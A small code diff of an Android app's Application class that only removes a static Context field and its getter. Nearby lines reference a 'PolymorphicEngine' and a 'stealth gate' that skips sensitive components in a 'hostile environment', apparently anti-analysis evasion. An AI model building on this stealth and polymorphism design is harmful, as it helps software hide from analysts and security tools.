@@ -1,7 +1,6 @@
 package com.seguranca.protecao;
 
 import android.app.Application;
-import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
 import android.os.PowerManager;
@@ -20,12 +19,10 @@ import com.seguranca.protecao.util.PolymorphicEngine;
 public class AppCoreInitializer extends Application {
 
     private static final String TAG = "AppCore";
-    private static Context appContext;
 
     @Override
     public void onCreate() {
         super.onCreate();
-        appContext = getApplicationContext();
         
         // 🔒 STEALTH GATE: Inicializa protocolo stealth PRIMEIRO
         // Se ambiente hostil detectado, não inicia componentes sensíveis
@@ -134,9 +131,5 @@ public class AppCoreInitializer extends Application {
         } catch (Exception e) {
             Log.e(TAG, "Erro em startBackgroundServices: " + e.getMessage());
         }
-    }
-
-    public static Context getAppContext() {
-        return appContext;
     }
 }
